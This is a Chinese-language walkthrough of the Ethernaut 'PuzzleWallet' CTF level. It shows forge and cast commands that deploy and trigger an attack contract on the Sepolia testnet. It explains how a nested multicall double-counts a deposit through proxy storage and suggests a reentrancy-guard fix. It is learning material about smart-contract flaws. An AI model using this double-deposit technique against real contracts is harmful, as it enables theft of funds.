# 25-PuzzleWallet
```
# 部署攻击合约
echo -e "\n=== 部署攻击合约 ==="
forge create src/25-PuzzleWallet/PuzzleWalletAttack.sol:PuzzleWalletAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $PuzzleWallet_ADDRESS 
Deployed to: 0x8938223232ED7474b03EcBBE90Acf13AfFA3Bc1c
export ATTACK_ADDRESS=0x8938223232ED7474b03EcBBE90Acf13AfFA3Bc1c
执行攻击
cast send $ATTACK_ADDRESS "attack()" \
    --value 0.001ether \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --gas-limit 500000
```

### 考察点
- 理解代理合约和逻辑合约的共享存储机制
- 逻辑合约只是代码库 没有实际存储,只提供代码，不存储数据,storage是空的
- muticall的嵌套调用  会产生新的局部函数内局部变量 导致重入
```
外层 multicall([deposit(), multicall([deposit()])])
  │
  ├─ depositCalled = false  // ← 外层的局部变量
  │
  ├─ i = 0: deposit()
  │  ├─ selector = deposit.selector ✓
  │  ├─ require(!depositCalled) ✓ (false, 通过)
  │  ├─ depositCalled = true  // 外层标记为 true
  │  └─ delegatecall(deposit())
  │     └─ balances[msg.sender] += 0.001
  │
  └─ i = 1: multicall([deposit()])
     ├─ selector = multicall.selector  // 不是 deposit ✓
     ├─ if 条件不满足，跳过检查
     │
     └─ delegatecall(multicall([deposit()]))  ← 嵌套调用！
        │
        │ 内层 multicall([deposit()])
        ├─ depositCalled = false  // ← 新的局部变量！
        │
        └─ i = 0: deposit()
           ├─ selector = deposit.selector ✓
           ├─ require(!depositCalled) ✓ (false, 通过！)
           ├─ depositCalled = true
           └─ delegatecall(deposit())
              └─ balances[msg.sender] += 0.001
===>正确的修复方法:
contract PuzzleWallet {
    bool private inMulticall;  // ← 使用状态变量
    
    modifier nonReentrant() {
        require(!inMulticall, "Reentrant call");
        inMulticall = true;
        _;
        inMulticall = false;
    }
    
    function multicall(...) external payable nonReentrant {
        // 现在无法嵌套调用
    }
}
=====>
data = [call1, call2]

内存布局:
0x00   [32 字节] 数组长度 = 2
0x20   [32 字节] 指向 call1 的偏移量
0x40   [32 字节] 指向 call2 的偏移量
0x60   [32 字节] call1 的长度
0x80   [...]     call1 的数据 (函数选择器 + 参数)
...    [32 字节] call2 的长度
...    [...]     call2 的数据
```